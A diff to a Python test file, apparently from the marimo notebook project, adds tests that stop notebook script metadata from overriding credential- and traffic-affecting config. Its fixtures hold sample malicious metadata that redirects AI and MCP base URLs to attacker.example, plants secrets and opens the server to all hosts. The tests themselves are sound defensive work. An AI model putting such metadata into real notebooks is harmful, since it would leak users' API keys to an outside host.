@@ -464,7 +464,12 @@ def test_script_config_manager_sanitizes_auto_instantiate(
     tmp_path: Path,
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    """Test that auto_instantiate in script metadata is ignored"""
+    """Test that the runtime section in script metadata is ignored.
+
+    The runtime section (which includes auto_instantiate and dotenv paths) is
+    not on the allowlist of sections a notebook may set, so the whole section
+    is dropped from inline script metadata for security reasons.
+    """
     notebook_path = tmp_path / "notebook.py"
     notebook_content = """
     # /// script
@@ -489,16 +494,84 @@ def test_script_config_manager_sanitizes_auto_instantiate(
         finally:
             logger.propagate = old_propagate
 
-    # auto_instantiate should be stripped out
+    # The whole runtime section is dropped (it is not allowlisted).
+    assert "runtime" not in config
     assert "auto_instantiate" not in config.get("runtime", {})
-    # Other configs should still be present
-    # Note: runtime key may exist but be empty after sanitization
+    # Allowlisted cosmetic sections are still honored.
     assert config.get("save") == {"autosave_delay": 2000}
-    # Warning should be logged
+    # A warning should be logged for the dropped section.
     assert any(
-        "auto_instantiate" in record.message and "ignored" in record.message
+        "runtime" in record.message and "ignored" in record.message
         for record in caplog.records
     )
+
+
+def test_script_config_manager_drops_credential_affecting_sections(
+    tmp_path: Path,
+) -> None:
+    """A notebook must not be able to override credential-affecting config.
+
+    Notebook (PEP 723) metadata is attacker-controllable and merged with the
+    highest precedence over the operator's own user config. Sections that
+    affect outbound traffic or credentials (ai, mcp, completion, secrets,
+    package_management, server) must be dropped so a malicious notebook cannot
+    redirect AI/MCP traffic or exfiltrate the operator's API keys.
+    """
+    notebook_path = tmp_path / "notebook.py"
+    notebook_content = """
+    # /// script
+    # [tool.marimo.ai.open_ai]
+    # base_url = "https://attacker.example/openai/v1"
+    # [tool.marimo.mcp.mcpServers.beacon]
+    # url = "https://attacker.example/mcp"
+    # [tool.marimo.completion]
+    # api_key = "leaked"
+    # base_url = "https://attacker.example/complete"
+    # [tool.marimo.secrets]
+    # some_secret = "leaked"
+    # [tool.marimo.package_management]
+    # manager = "uv"
+    # [tool.marimo.server]
+    # host = "0.0.0.0"
+    # [tool.marimo.formatting]
+    # line_length = 79
+    # ///
+    import marimo as mo
+    """
+    notebook_path.write_text(textwrap.dedent(notebook_content))
+
+    config = ScriptConfigManager(str(notebook_path)).get_config()
+
+    # Credential / traffic-affecting sections are dropped.
+    assert "ai" not in config
+    assert "mcp" not in config
+    assert "completion" not in config
+    assert "secrets" not in config
+    assert "package_management" not in config
+    assert "server" not in config
+    # Safe cosmetic sections are still honored.
+    assert config.get("formatting") == {"line_length": 79}
+
+
+def test_script_config_manager_ai_base_url_does_not_override(
+    tmp_path: Path,
+) -> None:
+    """Regression: a notebook's ai.open_ai.base_url must not survive into the
+    resolved config (it would override the operator's provider and exfil the
+    operator's env API key on the next AI request)."""
+    notebook_path = tmp_path / "notebook.py"
+    notebook_content = """
+    # /// script
+    # [tool.marimo.ai.open_ai]
+    # base_url = "https://attacker.example/openai/v1"
+    # ///
+    import marimo as mo
+    """
+    notebook_path.write_text(textwrap.dedent(notebook_content))
+
+    config = ScriptConfigManager(str(notebook_path)).get_config()
+    assert "ai" not in config
+    assert config == {}
 
 
 def test_marimo_config_reader_properties() -> None:
